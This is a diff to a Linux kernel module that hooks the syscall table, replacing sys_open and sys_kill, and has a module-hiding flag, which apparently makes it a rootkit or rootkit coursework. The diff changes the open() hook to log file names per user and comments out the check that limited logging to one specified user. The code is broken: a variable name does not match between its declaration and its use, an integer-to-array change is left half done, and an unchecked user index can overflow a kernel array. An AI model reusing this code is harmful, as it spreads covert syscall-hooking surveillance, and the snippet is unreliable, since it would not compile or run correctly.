@@ -18,9 +18,9 @@ void ** sctable ;
 bool hiding = false;
 struct module *current_mod;
 struct list_head *temp_module_list;
-int count = 0;
+int count[1001] = { 0 };
 int specified_Id = 0;
-char logfile[10][128];
+char logfile[1001][10][128];
 
 asmlinkage int (*orig_sys_kill)(pid_t pid, int signal) ;
 asmlinkage int (*orig_sys_open)(const char __user * filename, int flags, umode_t mode) ; 
@@ -34,21 +34,21 @@ asmlinkage int m_sys_open(const char __user * filename, int flags, umode_t mode)
 	
 
 	/* TODO: */
-	if (specified_Id == input_user) {
+// 	if (specified_Id == input_user) {
 		if(strcmp(".", fname) != 0){
 			if(fname[0] != '/'){
-				if(count != 10){
-					strncpy(logfile[count], fname, 127);
-					count ++;
+				if(count[input_user] != 10){
+					strncpy(logfile[input_user][count[input_user]], fname, 127);
+					count[input_user] ++;
 				}else{
 					for(i = 0; i < 9; i++){
-						strncpy(logfile[i], logfile[i + 1], 127);
+						strncpy(logfile[input_user][i], logfile[input_user][i + 1], 127);
 					}
-					strncpy(logfile[9], fname, 127);
+					strncpy(logfile[input_user][9], fname, 127);
 				}			
 			}
 		}
-	}
+// 	}
 
 	return orig_sys_open(filename, flags, mode) ;
 }
@@ -80,8 +80,13 @@ ssize_t m_read(struct file *file, char __user *ubuf, size_t size, loff_t *offset
 	if(count == 0){
 		sprintf(buf, "there is no log\n");
 	}else{	
+		char us_id_str[20];
+		sprintf(u_id_str, "%d\n", specified_Id);
+		
+		strcat(buf, "user: ");
+		strcat(buf, u_id_str);
 		for(k = 0; k < count; k++){
-			sprintf(temp,"%d. %s\n",  k + 1, logfile[k]);
+			sprintf(temp,"%d) %s\n",  k + 1, logfile[specified_Id][k]);
 			strcat(buf, temp);
 		}
 	}
